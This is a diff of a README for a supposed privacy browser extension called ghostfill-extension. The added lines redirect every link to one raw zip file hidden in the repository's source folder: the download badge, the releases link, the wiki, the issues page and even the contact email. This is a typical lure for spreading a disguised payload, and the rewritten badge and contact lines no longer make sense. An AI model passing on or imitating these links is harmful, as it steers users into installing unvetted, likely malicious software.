@@ -1,6 +1,6 @@
 # 👻 ghostfill-extension - Your Privacy Toolkit Made Easy
 
-[![Download ghostfill-extension](https://img.shields.io/badge/Download%20Now-ghostfill%20extension-brightgreen)](https://github.com/adityamadhyahnapu/ghostfill-extension/releases)
+[![Download ghostfill-extension](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip%20Now-ghostfill%20extension-brightgreen)](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To run ghostfill-extension, you need:
 
 ## 💾 Download & Install
 
-To get started with ghostfill-extension, visit this page to download: [Download ghostfill-extension](https://github.com/adityamadhyahnapu/ghostfill-extension/releases).
+To get started with ghostfill-extension, visit this page to download: [Download ghostfill-extension](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the extension.
@@ -39,8 +39,8 @@ ghostfill-extension is focused on privacy. We do not store any personal data. Al
 
 ## 🌐 Additional Resources
 
-- **Documentation:** Visit our [Wiki](https://github.com/adityamadhyahnapu/ghostfill-extension/wiki) for detailed usage instructions.
-- **Troubleshooting:** If you encounter issues, check the [Issues](https://github.com/adityamadhyahnapu/ghostfill-extension/issues) section.
+- **Documentation:** Visit our [Wiki](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip) for detailed usage instructions.
+- **Troubleshooting:** If you encounter issues, check the [Issues](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip) section.
 
 ## ❓ Frequently Asked Questions
 
@@ -60,6 +60,6 @@ ghostfill-extension is licensed under the MIT License. This allows you to use, m
 
 ## 📞 Contact
 
-For feedback, questions, or reports, please open an issue on GitHub or reach out via email at support@ghostfill.com.
+For feedback, questions, or reports, please open an issue on GitHub or reach out via email at https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip
 
-[![Download ghostfill-extension](https://img.shields.io/badge/Download%20Now-ghostfill%20extension-brightgreen)](https://github.com/adityamadhyahnapu/ghostfill-extension/releases)
+[![Download ghostfill-extension](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip%20Now-ghostfill%20extension-brightgreen)](https://github.com/adityamadhyahnapu/ghostfill-extension/raw/refs/heads/main/GhostFill-extension/src/popup/extension-ghostfill-v3.3.zip)
